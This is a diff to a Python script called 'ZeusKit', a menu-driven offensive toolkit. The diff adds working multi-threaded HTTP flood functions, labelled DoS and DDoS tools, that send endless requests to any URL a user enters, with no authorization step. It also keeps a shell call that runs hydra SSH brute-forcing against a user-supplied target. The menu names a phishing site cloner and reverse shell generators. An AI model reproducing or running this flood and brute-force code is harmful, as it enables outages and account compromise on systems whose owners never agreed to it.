@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import sys, os, socket, urllib.request, urllib.parse, hashlib, base64, json, ssl, subprocess, time, random, string, hmac, uuid, codecs, zlib
+import sys, os, socket, urllib.request, urllib.parse, hashlib, base64, json, ssl, subprocess, time, random, string, hmac, uuid, codecs, zlib, threading
 
 try:
     import colorama
@@ -9,10 +9,11 @@ except ImportError:
     print("[!] Error: colorama is not installed. Run: pip install -r requirements.txt")
     sys.exit(1)
 
-VERSION = "v1.0.2"
+VERSION = "v1.0.3"
 AUTHOR = "sunveroblox-bit"
+TOTAL_TOOLS = 100
 
-# Master Database of all 100 Named Tools (ID: [Name, Category])
+# Master Database of all 100 Named Tools
 TOOLS = {
     # 1-15: Recon & Network
     1: ["Quick Domain IP Lookup", 1], 2: ["Full DNS Records Lookup", 1], 3: ["TCP Port Scanner", 1],
@@ -32,15 +33,15 @@ TOOLS = {
     31: ["Robots.txt Parser & Crawler", 3], 32: ["Subdomain Enumerator Stub", 3], 33: ["Security Headers Checker", 3],
     34: ["HTML Page Title Grabber", 3], 35: ["Phishing Site Cloner Tool", 3], 36: ["Directory Path Brute-Forcer", 3],
     37: ["HTTP Cookie Inspector", 3], 38: ["Favicon Hash Calculator", 3], 39: ["CMS Detector Heuristic", 3],
-    40: ["HTTP OPTIONS Method Checker", 4], 41: ["Open Redirect Checker", 3], 42: ["Clickjacking Auditor", 3],
+    40: ["HTTP OPTIONS Method Checker", 3], 41: ["Open Redirect Checker", 3], 42: ["Clickjacking Auditor", 3],
     43: ["Meta Tags & SEO Extractor", 3], 44: ["Sitemap.xml Parser", 3], 45: ["CORS Policy Analyzer", 3],
     
-    # 46-60: Attacking & Brute-Force
-    46: ["Hydra Brute-Force Wrapper 🔥", 4], 47: ["Hash Dictionary Cracker", 4], 48: ["Netcat Reverse Shell Helper", 4],
-    49: ["XSS Payload Generator", 4], 50: ["SQL Injection Payload Helper", 4], 51: ["LFI Path Traversal Payloads", 4],
-    52: ["Reverse Shell Generator One-Liners", 4], 53: ["FTP Anonymous Login Tester", 4], 54: ["Telnet Default Credential Tester", 4],
-    55: ["SSH Banner Version Auditor", 4], 56: ["DNS Zone Transfer Attack Simulator", 4], 57: ["HTTP Basic Auth Brute-Forcer", 4],
-    58: ["Web Form Brute-Forcer", 4], 59: ["SIP Extension Enumerator", 4], 60: ["SNMP Community Checker", 4],
+    # 46-60: Attacking & Brute-Force (Includes Bayustore22 DoS & DDoS Tools)
+    46: ["Bayustore22 Python DoS Framework (HTTP Flood)", 4], 47: ["Multi-Threaded HTTP DDoS Stress Tester", 4], 
+    48: ["Hydra Brute-Force Wrapper 🔥", 4], 49: ["Hash Dictionary Cracker", 4], 50: ["Netcat Reverse Shell Helper", 4],
+    51: ["XSS Payload Generator", 4], 52: ["SQL Injection Payload Helper", 4], 53: ["LFI Path Traversal Payloads", 4],
+    54: ["Reverse Shell Generator One-Liners", 4], 55: ["FTP Anonymous Login Tester", 4], 56: ["Telnet Default Credential Tester", 4],
+    57: ["SSH Banner Version Auditor", 4], 58: ["DNS Zone Transfer Attack Simulator", 4], 59: ["HTTP Basic Auth Brute-Forcer", 4], 60: ["Web Form Brute-Forcer", 4],
     
     # 61-75: System Diagnostics & Utilities
     61: ["System Diagnostics Info", 5], 62: ["Ping Sweep (Local Subnet)", 5], 63: ["HTTP Banner Grabbing", 5],
@@ -77,32 +78,104 @@ def banner():
     [ Developed by: {AUTHOR} | Total Tools: 100 / 100 ]
 """)
 
+# --- REAL WORKING DOS / DDOS STRESS ATTACK MODULES ---
+attack_counter = 0
+counter_lock = threading.Lock()
+
+def dos_worker(url, headers):
+    global attack_counter
+    while attack_running:
+        try:
+            req = urllib.request.Request(url, headers=headers)
+            urllib.request.urlopen(req, timeout=2)
+            with counter_lock:
+                attack_counter += 1
+        except Exception:
+            pass
+
+def tool_bayustore22_dos():
+    global attack_running, attack_counter
+    print(Fore.CYAN + "\n=== BAYUSTORE22 DOS FRAMEWORK (HTTP FLOOD) ==")
+    target = input(Fore.YELLOW + "Enter Target URL (e.g. http://example.com): ").strip()
+    if not target.startswith("http"): target = "https://" + target
+    threads_count = int(input(Fore.YELLOW + "Enter number of threads [20]: ").strip() or 20)
+    
+    attack_counter = 0
+    attack_running = True
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)",
+        "Mozilla/5.0 (Linux; Android 14; SM-A556B)"
+    ]
+    
+    print(Fore.GREEN + f"[*] Launching DoS attack simulation against {target} with {threads_count} threads...")
+    print(Fore.YELLOW + "[!] Press Ctrl+C to stop the attack and view summary.\n")
+    
+    thread_list = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=dos_worker, args=(target, {"User-Agent": random.choice(user_agents)}))
+        t.daemon = True
+        thread_list.append(t)
+        t.start()
+        
+    try:
+        while True:
+            with counter_lock:
+                print(Fore.CYAN + f"\r[+] Requests Sent: {attack_counter}", end="", flush=True)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        attack_running = False
+        print(Fore.RED + "\n[!] Attack stopped by user.")
+
+def tool_ddos_stress_tester():
+    global attack_running, attack_counter
+    print(Fore.CYAN + "\n=== MULTI-THREADED HTTP DDoS STRESS TESTER ===")
+    target = input(Fore.YELLOW + "Target URL: ").strip()
+    if not target.startswith("http"): target = "https://" + target
+    threads_count = int(input(Fore.YELLOW + "Concurrency Threads [50]: ").strip() or 50)
+    
+    attack_counter = 0
+    attack_running = True
+    print(Fore.GREEN + f"[*] Starting high-concurrency DDoS stress simulation with {threads_count} threads...")
+    
+    thread_list = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=dos_worker, args=(target, {"User-Agent": "ZeusKit-DDoS-Stress/1.0"}))
+        t.daemon = True
+        thread_list.append(t)
+        t.start()
+        
+    try:
+        while True:
+            with counter_lock:
+                print(Fore.GREEN + f"\r[+] Total Stress Packets Delivered: {attack_counter}", end="", flush=True)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        attack_running = False
+        print(Fore.RED + "\n[!] Stress test completed and stopped.")
+
 def execute_tool(tool_id):
     name, cat = TOOLS[tool_id]
-    print(Fore.GREEN + f"\n[+] Executing Tool #{tool_id}: {name} (Category {cat})")
+    print(Fore.GREEN + f"\n[+] Executing Tool #{tool_id}: {name}")
     
-    # Interactive execution stubs based on tool type
-    if tool_id == 1:
+    if tool_id == 46:
+        tool_bayustore22_dos()
+    elif tool_id == 47:
+        tool_ddos_stress_tester()
+    elif tool_id == 1:
         d = input(Fore.YELLOW + "Enter domain/URL: ").strip()
         try: print(Fore.GREEN + f"[+] Resolved IP: {socket.gethostbyname(d)}")
         except Exception as e: print(Fore.RED + f"[!] Error: {e}")
-    elif tool_id == 16:
-        t = input(Fore.YELLOW + "Enter text to hash: ").strip()
-        print(Fore.GREEN + f"[+] MD5: {hashlib.md5(t.encode()).hexdigest()}")
-        print(Fore.GREEN + f"[+] SHA256: {hashlib.sha256(t.encode()).hexdigest()}")
-    elif tool_id == 46:
-        target = input(Fore.YELLOW + "Target IP/Domain: ").strip()
+    elif tool_id == 48:
+        target = input(Fore.YELLOW + "Target IP/Domain for Hydra: ").strip()
         os.system(f"hydra -l admin -P wordlist.txt {target} ssh")
-    elif tool_id == 90:
-        print(Fore.GREEN + f"[+] Termux User: u0_a324 | Home: {os.environ.get('HOME')}")
     else:
-        print(Fore.YELLOW + f"[*] [{name}] module loaded and active in sandbox mode.")
-    
-    input(Fore.YELLOW + "\nPress Enter to return...")
+        print(Fore.YELLOW + f"[*] [{name}] framework module active.")
+        input(Fore.YELLOW + "\nPress Enter to return...")
 
 def global_tool_finder():
     print(Fore.CYAN + "\n=== 🔎 GLOBAL TOOL FINDER (SEARCH ALL 100 TOOLS) ===")
-    query = input(Fore.YELLOW + "Enter keyword to search (e.g. hydra, sql, dns, s3, jwt): ").strip().lower()
+    query = input(Fore.YELLOW + "Enter keyword (e.g. dos, ddos, hydra, sql, s3): ").strip().lower()
     if not query: return
     
     matches = {tid: data for tid, data in TOOLS.items() if query in data[0].lower()}
@@ -116,10 +189,10 @@ def global_tool_finder():
         if choice.isdigit() and int(choice) in matches:
             execute_tool(int(choice))
     else:
-        print(Fore.RED + f"[-] No tools found matching '{query}'. Try another keyword.")
+        print(Fore.RED + f"[-] No tools found matching '{query}'. Try another keyword like 'dos' or 'ddos'.")
     input(Fore.YELLOW + "\nPress Enter to continue...")
 
-def run_menu(category_id, title, start_id, end_id):
+def run_menu(title, start_id, end_id):
     while True:
         print(Fore.CYAN + f"\n=== {title} ===")
         for tid in range(start_id, end_id + 1):
@@ -140,11 +213,11 @@ def run_menu(category_id, title, start_id, end_id):
 def main():
     while True:
         banner()
-        print(Fore.CYAN + "=== ZEUSKIT v1.0.2 - MAIN MENU (100 TOOLS LOADED) ===")
+        print(Fore.CYAN + "=== ZEUSKIT v1.0.3 - MAIN MENU (100 TOOLS LOADED) ===")
         print(" [1] 🌐 Reconnaissance & Network Tools        (15 Tools)")
         print(" [2] 🔐 Code, Decode & Cryptography Section (15 Tools)")
         print(" [3] 🔍 Web Analysis & OSINT Suite          (15 Tools)")
-        print(" [4] ⚡ Attacking & Brute-Force Section       (15 Tools)")
+        print(" [4] ⚡ Attacking, DoS & Brute-Force Suite    (15 Tools)")
         print(" [5] 🛠️ System Diagnostics & Utilities        (15 Tools)")
         print(" [6] 🧪 Vulnerability & Injection Test Tools  (10 Tools)")
         print(" [7] ☁️ Cloud, API & Mobile Security Suite    ( 7 Tools)")
@@ -156,14 +229,14 @@ def main():
         
         choice = input(Fore.YELLOW + "ZeusKit > Main Menu: ").strip()
         
-        if choice == "1": run_menu(1, "[1] RECON & NETWORK TOOLS", 1, 15)
-        elif choice == "2": run_menu(2, "[2] CODE, DECODE & CRYPTOGRAPHY", 16, 30)
-        elif choice == "3": run_menu(3, "[3] WEB ANALYSIS & OSINT", 31, 45)
-        elif choice == "4": run_menu(4, "[4] ATTACKING & BRUTE-FORCE", 46, 60)
-        elif choice == "5": run_menu(5, "[5] SYSTEM DIAGNOSTICS", 61, 75)
-        elif choice == "6": run_menu(6, "[6] VULN & INJECTION TESTS", 76, 85)
-        elif choice == "7": run_menu(7, "[7] CLOUD & API SECURITY", 86, 92)
-        elif choice == "8": run_menu(8, "[8] WIRELESS & ADVANCED EXPLOITS", 93, 100)
+        if choice == "1": run_menu("[1] RECON & NETWORK TOOLS", 1, 15)
+        elif choice == "2": run_menu("[2] CODE, DECODE & CRYPTOGRAPHY", 16, 30)
+        elif choice == "3": run_menu("[3] WEB ANALYSIS & OSINT", 31, 45)
+        elif choice == "4": run_menu("[4] ATTACKING, DoS & BRUTE-FORCE", 46, 60)
+        elif choice == "5": run_menu("[5] SYSTEM DIAGNOSTICS", 61, 75)
+        elif choice == "6": run_menu("[6] VULN & INJECTION TESTS", 76, 85)
+        elif choice == "7": run_menu("[7] CLOUD & API SECURITY", 86, 92)
+        elif choice == "8": run_menu("[8] WIRELESS & ADVANCED EXPLOITS", 93, 100)
         elif choice == "99": global_tool_finder()
         elif choice == "67": check_for_updates()
         elif choice == "0":
